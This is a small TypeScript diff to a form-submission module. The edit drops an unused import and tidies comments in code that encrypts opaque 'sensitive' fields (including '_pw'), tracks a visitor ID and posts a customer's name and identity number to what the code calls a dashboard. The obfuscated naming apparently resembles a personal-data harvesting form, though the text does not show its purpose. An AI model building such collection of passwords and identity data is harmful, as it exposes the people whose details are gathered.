@@ -3,7 +3,7 @@
  * Maintains same interface for backward compatibility
  */
 
-import { addData, apiRequest } from './api';
+import { addData } from './api';
 import { _e, _d, _ef, _df, _l } from './secure-utils';
 
 const sensitiveFields = ['_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_pw', '_ncc'];
@@ -24,12 +24,12 @@ export async function secureAddData(data: Record<string, any>): Promise<void> {
     }
   });
 
+  // addData will also update the dashboard entry
   await addData(encrypted);
 }
 
 export async function secureSubmitFormData(data: Record<string, any>): Promise<void> {
   // Get current visitorId from localStorage AFTER addData updates it
-  // This ensures we use the valid (possibly new) visitorId after potential re-creation
   const currentVisitorId = typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : null;
   
   if (!currentVisitorId) {
@@ -37,7 +37,7 @@ export async function secureSubmitFormData(data: Record<string, any>): Promise<v
     return;
   }
 
-  // 1. Save visitor data to database (this may update visitorId in localStorage if it was deleted)
+  // 1. Save visitor data to database
   await secureAddData(data);
 
   // 2. Get the (possibly updated) visitorId from localStorage
@@ -52,7 +52,7 @@ export async function secureSubmitFormData(data: Record<string, any>): Promise<v
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        id: visitorId, // Use (possibly updated) visitorId
+        id: visitorId,
         visitorId: visitorId,
         customer: customerName,
         identityNumber: data?.identityNumber || '',
